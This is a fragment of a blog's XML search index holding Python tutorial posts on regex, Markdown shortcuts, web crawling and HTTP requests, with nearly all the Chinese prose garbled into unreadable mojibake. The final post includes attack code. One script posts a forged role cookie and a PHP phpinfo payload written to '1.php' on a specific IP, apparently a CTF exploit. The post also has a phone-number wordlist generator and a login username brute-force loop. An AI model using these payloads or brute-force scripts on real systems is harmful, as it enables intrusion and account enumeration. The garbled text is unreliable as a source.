r&apos;dogs&apos;, line, re.M|re.I) if matchObj: print &quot;match --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; matchObj = re.search( r&apos;dogs&apos;, line, re.M|re.I) if matchObj: print &quot;search --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot;ÂèÇËÄÉÔºöÊñáÁ´† ÂèÇËÄÉÔºöÊñáÁ´†]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdownpadÂü∫Êú¨‰ΩøÁî®]]></title>
    <url>%2F2018%2F08%2F31%2Fmarkdownpad%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[#markdownÂü∫Êú¨‰ΩøÁî®ÂëΩ‰ª§ Âü∫Êú¨ÂëΩ‰ª§ ctrl+1 ‰∏ÄÁ∫ßÊ†áÈ¢ò ctrl+2 ‰∫åÁ∫ßÊ†áÈ¢òÂÖ±ÂÖ≠Á∫ßÊ†áÈ¢ò ctrl+shift+o ÊúâÂ∫èÂàóË°® ctrl+u Êó†Â∫èÂàóË°® ctrl+g ÊèíÂÖ•ÂõæÁâá ctrl+l ÊèíÂÖ•Ë∂ÖÈìæÊé• ÊèíÂÖ•ËøûÊé•[baidu](http://baidu.com) ‰æãÔºöbaidu ÊèíÂÖ•ÂõæÁâá Markdown ÁöÑÁ≤ó‰ΩìÂíåÊñú‰Ωì‰πüÈùûÂ∏∏ÁÆÄÂçïÔºåÁî®‰∏§‰∏™ * ÂåÖÂê´‰∏ÄÊÆµÊñáÊú¨Â∞±ÊòØÁ≤ó‰ΩìÁöÑËØ≠Ê≥ïÔºåÁî®‰∏Ä‰∏™*ÂåÖÂê´‰∏ÄÊÆµÊñáÊú¨Â∞±ÊòØÊñú‰ΩìÁöÑËØ≠Ê≥ï„ÄÇ ‰ª£Á†ÅÊ°Ü Âè™ÈúÄË¶ÅÁî®‰∏§‰∏™ ` Êää‰∏≠Èó¥ÁöÑ‰ª£Á†ÅÂåÖË£πËµ∑Êù•ÔºåÂ¶Ç code ÂàÜÂâ≤Á∫ø Âè™ÈúÄË¶ÅËøûÁª≠ËæìÂÖ•‰∏â‰∏™***ÊàñËÄÖ‚Äî„ÄÇ Âø´Êç∑ÈîÆ Âä†Á≤ó Ctrl + B Êñú‰Ωì Ctrl + I ÂºïÁî® Ctrl + Q ÊèíÂÖ•ÈìæÊé• Ctrl + L ÊèíÂÖ•‰ª£Á†Å Ctrl + K ÊèíÂÖ•ÂõæÁâá Ctrl + G ÊèêÂçáÊ†áÈ¢ò Ctrl + H ÊúâÂ∫èÂàóË°® Ctrl + O Êó†Â∫èÂàóË°® Ctrl + U Ê®™Á∫ø Ctrl + R Êí§ÈîÄ Ctrl + Z ÈáçÂÅö Ctrl + Y ÂèÇËÄÉÔºöÊñáÁ´†]]></content>
      <tags>
        <tag>ÊùÇ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Áà¨Ëô´Âü∫Á°Ä]]></title>
    <url>%2F2018%2F08%2F31%2F%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[#pythonÁà¨Ëô´Âü∫Á°Ä python requestsÂ∏∏Áî®Â∫ìÊñáÁ´†ÈìæÊé• python2.x‰∏é3.xurllibÂ∫ìÂú®python2‰∏épython3‰∏≠ÁöÑÂå∫Âà´ UrllibÊòØpythonÊèê‰æõÁöÑ‰∏Ä‰∏™Áî®‰∫éÊìç‰ΩúurlÁöÑÊ®°Âùó„ÄÇ Âú®python2‰∏≠ÔºåÊúâurllibÂ∫ìÂíåurllib2Â∫ì„ÄÇÂú®python3‰∏≠Ôºåurllib2ÂêàÂπ∂Âà∞urllibÂ∫ì‰∏≠,Êàë‰ª¨Áà¨ÂèñÁΩëÈ°µÁöÑÊó∂ÂÄôÔºåÁªèÂ∏∏Áî®Âà∞Ëøô‰∏™Â∫ì„ÄÇ ÂçáÁ∫ßÂêàÂπ∂ÂêéÔºåÊ®°Âùó‰∏≠ÂåÖÁöÑ‰ΩçÁΩÆÂèòÂåñÁöÑÂú∞ÊñπËæÉÂ§ö„ÄÇ ‰ª•‰∏ãÊòØpython2‰∏épython3‰∏≠Â∏∏Áî®ÁöÑÂÖ≥‰∫éurllibÂ∫ìÁöÑÂèòÂåñÔºö 1.Âú®python2‰∏≠‰ΩøÁî®import urllib2‚Äî‚Äî‚Äî‚ÄîÂØπÂ∫îÁöÑÔºåÂú®python3‰∏≠‰ºö‰ΩøÁî®import urllib.request,urllib.error 2.Âú®python2‰∏≠‰ΩøÁî®import urllib‚Äî‚Äî‚Äî‚ÄîÂØπÂ∫îÁöÑÔºåÂú®python3‰∏≠‰ºö‰ΩøÁî®import urllib.request,urllib.error,urllib.parse 3.Âú®python2‰∏≠‰ΩøÁî®import urlparse‚Äî‚Äî‚Äî‚ÄîÂØπÂ∫îÁöÑÔºåÂú®python3‰∏≠‰ºö‰ΩøÁî®import urllib.parse 4.Âú®python2‰∏≠‰ΩøÁî®urllib2.urlopen‚Äî‚Äî‚Äî‚ÄîÂØπÂ∫îÁöÑÔºåÂú®python3‰∏≠‰ºö‰ΩøÁî®urllib.request.urlopen 5.Âú®python2‰∏≠‰ΩøÁî®urllib.urlencode‚Äî‚Äî‚Äî‚ÄîÂØπÂ∫îÁöÑÔºåÂú®python3‰∏≠‰ºö‰ΩøÁî®urllib.parse.urlencode 6.Âú®python2‰∏≠‰ΩøÁî®urllib.quote‚Äî‚Äî‚Äî‚ÄîÂØπÂ∫îÁöÑÔºåÂú®python3‰∏≠‰ºö‰ΩøÁî®urllib.request.quote 7.Âú®python2‰∏≠‰ΩøÁî®cookielib.CookieJar‚Äî‚Äî‚Äî‚ÄîÂØπÂ∫îÁöÑÔºåÂú®python3‰∏≠‰ºö‰ΩøÁî®http.CookieJar 8.Âú®python2‰∏≠‰ΩøÁî®urllib2.Request‚Äî‚Äî‚Äî‚ÄîÂØπÂ∫îÁöÑÔºåÂú®python3‰∏≠‰ºö‰ΩøÁî®urllib.request.Request 9.cookielib Áî® http.cookiejar ‰ª£Êõø 10.print ‚Äú ‚Äú Áî® print(‚Äú ‚Äú) ‰ª£Êõø 11.urllib2.URLError Áî® urllib.error.URLError ‰ª£Êõø 12.urllib2.HTTPError Áî® urllib.error.HTTPError ‰ª£Êõø 13.except urllib2.URLError, e: Áî® except urllib.error.URLError as e: ‰ª£Êõø 14.response.textËøîÂõûÁöÑÊòØUnicodeÁ±ªÂûãÁöÑÊï∞ÊçÆÔºå response.contentËøîÂõûÁöÑÊòØbuyesÂûã‰πüÂ∞±ÊòØ‰∫åËøõÂà∂ÁöÑÊï∞ÊçÆ ÂèÇËÄÉÔºöÊñáÁ´† ÁÆÄÂçïÊµãËØïÁà¨Ë°åfrom urllib.request import urlopen response = urlopen(&quot;http://www.baidu.com&quot;) a=response.read() print(a)//3.xÁâàÊú¨printÂ∑≤ÁªèÊòØ‰∏Ä‰∏™ÂáΩÊï∞ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂä†Êã¨Âè∑‰∏äËø∞‰ª£Á†ÅÂ∞±ÂèØËΩªÊùæÁà¨Ë°åÂá∫baiduÁöÑÁΩëÈ°µÊ∫êÁ†Å È¶ñÂÖàÊàë‰ª¨Ë∞ÉÁî®ÁöÑÊòØurllib2Â∫ìÈáåÈù¢ÁöÑurlopenÊñπÊ≥ïÔºå‰º†ÂÖ•‰∏Ä‰∏™URL,urlopenÂáΩÊï∞ÊòØÊúâ‰∏â‰∏™ÂèÇÊï∞ÁöÑÔºåurlopen(url,data,timeout)url‰∏∫ÈúÄË¶ÅÊâìÂºÄÁöÑÁΩëÂùÄdata‰∏∫Ë¶Å‰º†ËæìÁöÑÊï∞ÊçÆÂ¶ÇpostÊàñËÄÖgetÂèÇÊï∞timeoutÂª∂ËøüËÆæÁΩÆ headersËÆæÁΩÆÊ®°ÊãüÊµèËßàÂô® Êúâ‰∫õÁΩëÁ´ô‰∏ç‰ºöÂêåÊÑèÁ®ãÂ∫èÁõ¥Êé•Áî®‰∏äÈù¢ÁöÑÊñπÂºèËøõË°åËÆøÈóÆÔºåÂ¶ÇÊûúËØÜÂà´ÊúâÈóÆÈ¢òÔºåÈÇ£‰πàÁ´ôÁÇπÊ†πÊú¨‰∏ç‰ºöÂìçÂ∫îÔºåÊâÄ‰ª•‰∏∫‰∫ÜÂÆåÂÖ®Ê®°ÊãüÊµèËßàÂô®ÁöÑÂ∑•‰ΩúÔºåÊàë‰ª¨ÈúÄË¶ÅËÆæÁΩÆ‰∏Ä‰∫õHeaders ÁöÑÂ±ûÊÄßÔºåagentÂ∞±ÊòØËØ∑Ê±ÇÁöÑË∫´‰ªΩÔºåÂ¶ÇÊûúÊ≤°ÊúâÂÜôÂÖ•ËØ∑Ê±ÇË∫´‰ªΩÔºåÈÇ£‰πàÊúçÂä°Âô®‰∏ç‰∏ÄÂÆö‰ºöÂìçÂ∫îÔºåÊâÄ‰ª•ÂèØ‰ª•Âú®headers‰∏≠ËÆæÁΩÆagent„ÄÇÈò≤ÁõóÈìæÁöÑÊó∂ÂÄôÊúçÂä°Âô®‰ºöËØÜÂà´headers‰∏≠ÁöÑreferÊòØ‰∏çÊòØÂÆÉËá™Â∑±ÔºåÂ¶ÇÊûú‰∏çÊòØÔºåÊúçÂä°Âô®‰∏ç‰ºöÂìçÂ∫îÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÂú®headersÂä†ÂÖ•refer„ÄÇ‰æãÔºö headers = { &apos;User-Agent&apos; : &apos;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&apos;,&apos;Referer&apos;:&apos;http://www.zhihu.com/articles&apos; } ‰ª£ÁêÜËÆæÁΩÆ ÂÅáÂ¶Ç‰∏Ä‰∏™ÁΩëÁ´ôÂÆÉ‰ºöÊ£ÄÊµãÊüê‰∏ÄÊÆµÊó∂Èó¥Êüê‰∏™IP ÁöÑËÆøÈóÆÊ¨°Êï∞ÔºåÂ¶ÇÊûúËÆøÈóÆÊ¨°Êï∞ËøáÂ§öÔºåÂÆÉ‰ºöÁ¶ÅÊ≠¢‰Ω†ÁöÑËÆøÈóÆ„ÄÇÊâÄ‰ª•‰Ω†ÂèØ‰ª•ËÆæÁΩÆ‰∏Ä‰∫õ‰ª£ÁêÜÊúçÂä°Âô®Êù•Â∏ÆÂä©‰Ω†ÂÅöÂ∑•‰ΩúÔºåÊØèÈöî‰∏ÄÊÆµÊó∂Èó¥Êç¢‰∏Ä‰∏™‰ª£ÁêÜ„ÄÇ‰ª£Á†ÅÂ¶ÇÔºö import urllib2 enable_proxy = True proxy_handler = urllib2.ProxyHandler({&quot;http&quot; : &apos;http://some- proxy.com:8080&apos;}) null_proxy_handler = urllib2.ProxyHandler({}) if enable_proxy: opener = urllib2.build_opener(proxy_handler) else: opener = urllib2.build_opener(null_proxy_handler) urllib2.install_opener(opener) timeoutÂª∂Ëøü Êúâ‰∫õÁΩëÁ´ôÁ≠âÂæÖË∂ÖÊó∂Ôºå‰∏∫‰∫ÜËß£ÂÜ≥‰∏Ä‰∫õÁΩëÁ´ôÂÆûÂú®ÂìçÂ∫îËøáÊÖ¢ËÄåÈÄ†ÊàêÁöÑÂΩ±ÂìçÔºåÁî®Âà∞timeoutÂèÇÊï∞ import urllib2 response = urllib2.urlopen(&apos;http://www.baidu.com&apos;, timeout=10) pythonÂ≠óÁ¨¶‰∏≤strÂíåÂ≠óËäÇÊï∞ÁªÑÁõ∏‰∫íËΩ¨ÂåñÊñπÊ≥ï# bytes object b = b&quot;example&quot; # str object s = &quot;example&quot; # str to bytes bytes(s, encoding = &quot;utf8&quot;) # bytes to str str(b, encoding = &quot;utf-8&quot;) # an alternative method # str to bytes str.encode(s) # bytes to str bytes.decode(b)Áà¨Ë°åÁ≥ó‰∫ãÁôæÁßëË¥¥ËÑöÊú¨Ôºö #coding:utf-8 import requests import base64 import re url=&apos;https://www.qiushibaike.com/&apos; s=requests.Session() r=s.get(url) b=r.text b=re.findall(r&apos;(&lt;div class=&quot;content&quot;&gt;([\s\S])&lt;span&gt;([\s\S]){3}.*([\s\S]){2}&lt;/span&gt;)+([\s\S])&apos;,b) #b =&apos;&apos;.join(b) #a=matchaaa.replace(&quot; &quot;,&quot; &quot;) f=open(&apos;1.txt&apos;) #b=matchaaa b=f.read() b=b.replace(&quot;&lt;span&gt;&quot;,&quot; &quot;) b=b.replace(&apos;&lt;div class=&quot;content&quot;&gt;&apos;,&quot; &quot;) b=b.replace(&quot;&lt;/span&gt;&quot;,&quot; &quot;) b=b.replace(&quot;&apos;\\n&apos;&quot;,&quot; &quot;) b=b.replace(&quot;\\n&quot;,&quot; &quot;) if b: print(b)#Â§áÊ≥®Ëß£Êûê1.Ê≠£ÂàôÁöÑsearch()ÂáΩÊï∞ÔºåËøô‰∏™ÂáΩÊï∞ÂèØ‰ª•ÊâæÂà∞‰∏Ä‰∏™ÂåπÈÖçÁöÑÂ≠óÁ¨¶‰∏≤ËøîÂõûÔºå‰ΩÜÊòØÊÉ≥ÊâæÂà∞ÊâÄÊúâÂåπÈÖçÁöÑÂ≠óÁ¨¶‰∏≤ËøîÂõûÔºåÈúÄË¶Å‰ΩøÁî®findallÔºåfindallÂáΩÊï∞ËøîÂõûÁöÑÊÄªÊòØÊ≠£ÂàôË°®ËææÂºèÂú®Â≠óÁ¨¶‰∏≤‰∏≠ÊâÄÊúâÂåπÈÖçÁªìÊûúÁöÑÂàóË°®ÔºåÊ≠§Â§Ñ‰∏ªË¶ÅËÆ®ËÆ∫ÂàóË°®‰∏≠‚ÄúÁªìÊûú‚ÄùÁöÑÂ±ïÁé∞ÊñπÂºèÔºåÂç≥findall‰∏≠ËøîÂõûÂàóË°®‰∏≠ÊØè‰∏™ÂÖÉÁ¥†ÂåÖÂê´ÁöÑ‰ø°ÊÅØ„ÄÇÂõ†‰∏∫ËøîÂõûÂΩ¢Âºè‰∏∫Êï∞ÁªÑÊâÄ‰ª•ÂêéÈù¢replaceÊ†ºÂºèÂá∫‰∫ÜÊüê‰∫õÈóÆÈ¢òÊöÇ‰∏çÊòé„ÄÇ2.b=r.text ÊàñËÄÖ b=r.content.decode()ÈÉΩÂèØ Ê†ºÂºèclass str3.ËøôÈáåÁõ¥Êé•Â∞ÜÊäìÂèñÁöÑbÂéªreplaceÊä•ÈîôÔºå‰∏çÊòéÁôΩ‰∏∫Âï•Ê¨¢ËøéÂ§ßÁâõÊåáÂá∫ÔºåÊâÄ‰ª•‰øùÂ≠ò‰∫Ü‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÂÜçËØªÂèñÔºåÊ†ºÂºèÂ∞±Ê≠£Á°Æ„ÄÇ4.\n Ê≠£ÂàôÈÇ£ÈáåÈúÄË¶ÅËΩ¨‰πâ‰∏Ä‰∏™5.Áà¨Ëô´ÊúÄÂ•ΩÁî®beautiful soupÔºåÊú¨ÊñáÂè™ÊòØ‰∏∫‰∫ÜÁªÉ‰π†Ê≠£ÂàôÁ≠âpythonÁî®Ê≥ï„ÄÇÁªìÊûúÂ¶Ç‰∏ã: Áà¨ÂèñÁôæÂ∫¶#coding:utf-8 import requests import base64 import re from bs4 import BeautifulSoup#Áà¨Ëô´Â∏∏Áî®Ê®°Âùó import lxml headers = { &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate, compress&apos;, &apos;Accept-Language&apos;: &apos;en-us;q=0.5,en;q=0.3&apos;, &apos;Cache-Control&apos;: &apos;max-age=0&apos;, &apos;Connection&apos;: &apos;keep-alive&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0&apos; } str=raw_input(&quot;ËØ∑ËæìÂÖ•‰Ω†Ë¶ÅÊü•ÊâæÁöÑÂÖ≥ÈîÆÂ≠óÔºö&quot;)#ËæìÂÖ•Êü•ÊâæÁöÑÂÖ≥ÈîÆÂ≠ó pn=raw_input(&quot;ËØ∑ËæìÂÖ•‰Ω†Ë¶ÅÁà¨ÂèñÁöÑÈ°µÊï∞Ôºö&quot;)#ËæìÂÖ•ÈúÄË¶ÅÁà¨Ë°åÂá†È°µ pnn=int(pn) for i in range(0,pnn): pn = int(i) * 10 pn = bytes(pn) url=&apos;https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;tn=monline_4_dg&amp;wd=&apos;+str+&apos;&amp;oq=fdsfs&amp;rsv_pq=a3b95bf10006369b&amp;rsv_t=f84emHqbAsRGwITxX0xpSE8jCnNkrSbFv%2FO0WK9oEnD2ya1fJl1gCKe5peQZFBklaWQB&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=13&amp;rsv_sug1=12&amp;rsv_sug7=100&amp;bs=fdsfs&amp;pn=&apos;+pn r=requests.get(url,headers=headers)#Ê®°ÊãüÂÆ¢Êà∑Á´Ø‰º†ÈÄíÂèÇÊï∞ b=r.content b=&quot;&quot;.join(b) #ËÆ©ÂàóË°®ÂΩ¢ÂºèÁöÑtypeËΩ¨Âåñ‰∏∫strÂ≠óÁ¨¶‰∏≤ËøôÊ†∑ÊâçÂèØ‰ª•Áî®replace soup = BeautifulSoup(b,&quot;lxml&quot;) tagh3 = soup.find_all(&apos;h3&apos;) for h3 in tagh3: href = h3.find(&apos;a&apos;).get(&apos;href&apos;) baidu_url = requests.get(url=href, headers=headers, allow_redirects=False) real_url = baidu_url.headers[&apos;Location&apos;] # ÂæóÂà∞ÁΩëÈ°µÂéüÂßãÂú∞ÂùÄ with open(&apos;result/&apos;+str+&apos;.txt&apos;, &apos;a+&apos;) as f: #Â∞ÜÊñá‰ª∂‰ª•ÈôÑÂä†ÁöÑÊñπÂºèÂÜôÂÖ•ÊêúÁ¥¢ÂêçÂ≠ó.txtÊñá‰ª∂‰∏≠ f.write(real_url+&quot;\n&quot;) print(real_url) ÂèÇËÄÉÔºöÊñáÁ´†]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonÁöÑwebÂü∫Á°ÄÂ∫îÁî®]]></title>
    <url>%2F2018%2F08%2F31%2Fpython%E7%9A%84web%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[#ÁÆÄÂçïËÑöÊú¨ÂàÜ‰∫´ ÁÆÄÂçïÁà¨Ë°åÈ°µÈù¢ 3.x‰∏é2.ximport urllib.request #3.xÁâàÊú¨ url=&apos;http://www.baidu.com/&apos; def getHtml(url): page=urllib.request.urlopen(url) html=page.read().decode(encoding=&apos;utf-8&apos;,errors=&apos;strict&apos;) return html print(getHtml(url)) import requests #2.xÁâàÊú¨ import string headers = { &apos;Connection&apos;: &apos;Keep-Alive&apos;, &apos;Accept&apos;: &apos;text/html, application/xhtml+xml, */*&apos;, &apos;Accept-Language&apos;: &apos;en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 LB&apos; } url=&quot;https://www.qq.com&quot; res=requests.get(url,headers) print(res.text)post‰º†ÂèÇÔºåËÆæÁΩÆcookieÔºåÊà™ÂèñËøîÂõûÈ°µÈù¢Âõ∫ÂÆöÈïøÂ∫¶ 2.xurl=&apos;http://106.75.72.168:2222/index.php&apos; headers = { &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;, &apos;Accept-Encoding&apos;: &apos;gzip, deflate, compress&apos;, &apos;Accept-Language&apos;: &apos;en-us;q=0.5,en;q=0.3&apos;, &apos;Cache-Control&apos;: &apos;max-age=0&apos;, &apos;Connection&apos;: &apos;keep-alive&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0&apos;, &apos;cookie&apos;: &apos;Hm_lvt_9d483e9e48ba1faa0dfceaf6333de846=1542198011; role=Zjo1OiJucXp2YSI7&apos; } payload={&apos;filename&apos;:&apos;1.php&apos;,&apos;data[]&apos;:&apos;&lt;?php phpinfo();?&gt;&apos;} r=requests.post(url,headers=headers,data=payload) url=&quot;http://106.75.72.168:2222&quot;+r.content[82:128] r=requests.get(url) print r.contentÂ≠óÂÖ∏Âà∂‰Ωú ÂêÑÁâàÊú¨with open(&apos;wordlist.txt&apos;,&apos;w+&apos;) as f: for i in range(0,10): for j in range(0,10): for k in range(0,10): for h in range(0,10): f.write(&apos;1391040&apos;+str(i)+str(j)+str(k)+str(h)+&apos;\n&apos;) f.close‰øùÂ≠òÊú¨Âú∞Âà∞wordlist.txtÊñá‰ª∂Èáå1391040xxxxÁîüÊàêÂêéÂõõ‰ΩçÁöÑÂ≠óÂÖ∏„ÄÇ pythonÁôªÈôÜÁΩëÁ´ô 3.xfrom urllib import request#ÂØºÂÖ•urllibÊ®°ÂùóÈáåÁöÑrequest from urllib import parse#parseÊ®°ÂùóÈáåÁöÑÁºñÁ†Å from urllib.request import urlopen values ={&apos;zhanghao&apos;:&apos;admin&apos;,&apos;mima&apos;:&apos;admin&apos;} data=parse.urlencode(values).encode(&apos;utf-8&apos;)#Êèê‰∫§Á±ªÂûã‰∏çËÉΩ‰∏∫strÔºåÈúÄË¶Å‰∏∫byteÁ±ªÂûã,parse.urlencodeÊñπÊ≥ïÁöÑ‰ΩúÁî®ÊòØÊäädictÊ†ºÂºèÁöÑÂèÇÊï∞ËΩ¨Êç¢‰∏∫urlÂèÇÊï∞ÔºåÂπ∂‰ª•utf-8ÁºñÁ†Å,ÂèØ‰ª•ÊãºÊé•‰∏∫HTTPËØ∑Ê±Ç„ÄÇ url=&apos;http://127.0.0.1/login.php&apos; request=request.Request(url,data) response=urlopen(request) print(response.read().decode())#Âä†ÂÖ•decodeÊâçËÉΩ‰ΩøÁΩëÈ°µËß£Á†ÅÊàê‰∏≠ÊñáÊï¥ÁêÜ 3.xÁâàÊú¨import urllib.parse#urlencode import urllib.request#Request,urlopen &apos;&apos;&apos; response=urllib.request.urlopen(&quot;http://127.0.0.1&quot;) print(response.read().decode()) &apos;&apos;&apos; #ËÆæÁΩÆheaderÂíådata &apos;&apos;&apos; url=&apos;http://127.0.0.1/login.php&apos; user_agent=&apos;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&apos; values={&apos;zhanghao&apos;:&apos;admin&apos;,&apos;mima&apos;:&apos;admin&apos;} headers={&apos;User-Agent&apos;:user_agent} data=urllib.parse.urlencode(values).encode(&apos;utf-8&apos;) request=urllib.request.Request(url,data,headers) response=urllib.request.urlopen(request) page=response.read() print(page.decode()) &apos;&apos;&apos; #ËÆæÁΩÆ‰ª£ÁêÜ ÈÅøÂÖçÂõ†‰∏∫Êüê‰∏™IPÁöÑËÆøÈóÆÊ¨°Êï∞ËøáÂ§öÂØºËá¥ÁöÑÁ¶ÅÊ≠¢ËÆøÈóÆ &apos;&apos;&apos; enable_proxy = True proxy_handler = urllib.request.ProxyHandler({&quot;http&quot;:&apos;http://some-proxy.com:8080&apos;}) null_proxy_handler = urllib.request.ProxyHandler({}) if enable_proxy: opener = urllib.request.build_opener(proxy_handler) else: opener = urllib.request.build_opener(null_proxy_handler) urllib.request.install_opener(opener) &apos;&apos;&apos; #ËÆæÁΩÆtimeout # urlopen‰∏éRequest Âå∫Âà´https://blog.csdn.net/tao3741/article/details/75207879 &apos;&apos;&apos; response=urllib.request.urlopen(&apos;http://127.0.0.1&apos;,timeout=10) print(response.read().decode()) &apos;&apos;&apos; #post put Á≠âÊèê‰∫§ÊñπÂºè &apos;&apos;&apos; request=urllib.request.Request(url,data,headers)#post Áõ¥Êé•ÂÜôÂú®dataÈáå request=urllib.request.Request(&apos;http://127.0.0.1?a=1&apos;)#getÁõ¥Êé•ÂÜôÂú®urlÈáå request = urllib.request.Request(url, data=data)#putÂíådelete request.get_method = lambda:&apos;PUT&apos; #or &apos;DELETE&apos;#putÂíådelete &apos;&apos;&apos; #‰ΩøÁî®DebugLog ÊääÊî∂ÂèëÂåÖÁöÑÂÜÖÂÆπÂú®Â±èÂπï‰∏äÊâìÂç∞Âá∫Êù• &apos;&apos;&apos; httpHandler = urllib.request.HTTPHandler(debuglevel=1) httpsHandler = urllib.request.HTTPSHandler(debuglevel=1) opener = urllib.request.build_opener(httpHandler, httpsHandler) urllib.request.install_opener(opener) response = urllib.request.urlopen(&apos;http://127.0.0.1&apos;, timeout = 5) &apos;&apos;&apos; #URLErrorÂºÇÂ∏∏Â±ûÊÄßÂà§Êñ≠ &apos;&apos;&apos; request=urllib.request.Request(&apos;http://127.0.0.999&apos;) try: urllib.request.urlopen(request) except urllib.error.URLError as e: if hasattr(e, &quot;code&quot;): #hasattr Âà§Êñ≠ÂèòÈáèÊòØÂê¶ÊúâÊüê‰∏™Â±ûÊÄß print(e.code) if hasattr(e, &quot;reason&quot;): print(e.reason) else: print(&quot;OK&quot;) &apos;&apos;&apos;ËÆæÁΩÆcookieÔºåheader‰ª•ÂèäfindÊù•ÂåπÈÖçÁΩëÈ°µ‰∏≠ÊñáÂ≠óÁ¨¶„ÄÇ #coding=utf-8 import requests import sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) url=&quot;http://127.0.0.1&quot; cookie={&apos;User-Center&apos;:&apos;aa&apos;,&apos;csrf_token&apos;:&apos;aa&apos;} headers = { &apos;Connection&apos;: &apos;Keep-Alive&apos;, &apos;Accept&apos;: &apos;text/html, application/xhtml+xml, */*&apos;, &apos;Accept-Language&apos;: &apos;en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 LB&apos; } passwd=&quot;admin1&quot; dic = open(&apos;./22.txt&apos;, &apos;r&apos;) for dic in dic.readlines(): dic = dic.strip(&apos;\n&apos;) p=passwd+dic #print p data={&apos;csrf_token&apos;:&apos;aa&apos;,&apos;username&apos;:p,&apos;password&apos;:&apos;test&apos;,&apos;captcha&apos;:&apos;dsa&apos;} res=requests.post(url=url,data=data,cookies=cookie,headers=headers) #print res.text #zhengze= u&apos;\u9519\u8bef\u6b21\u6570&apos; #pat = re.compile(zhengze) if res.text.find(&apos;Áî®Êà∑‰∏çÂ≠òÂú®&apos;) != -1: print &apos;false&apos; else: with open(&apos;./success.txt&apos;,&apos;a&apos;) as f1: f1.write(p + &quot;\n&quot;)ÂèÇËÄÉÔºöÊñáÁ´†]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
</search>
